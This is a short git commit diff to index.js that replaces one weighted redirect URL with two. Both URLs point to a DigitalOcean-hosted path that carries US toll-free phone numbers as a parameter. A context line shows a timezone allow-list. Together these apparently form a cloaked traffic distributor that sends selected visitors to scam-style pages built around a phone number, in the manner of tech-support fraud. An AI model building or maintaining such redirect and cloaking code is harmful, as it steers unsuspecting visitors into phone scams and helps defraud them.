8825f267d0416ea6aaedb38c58bdfd7596d53583
paalakash <palaksh452@gmail.com>
2026-07-03 06:23:04 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-kfcmq.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
+    { url: "https://coral-app-kfcmq.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 0.5 },
+    { url: "https://coral-app-kfcmq.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-676", weight: 0.5 }
 
 ];
 
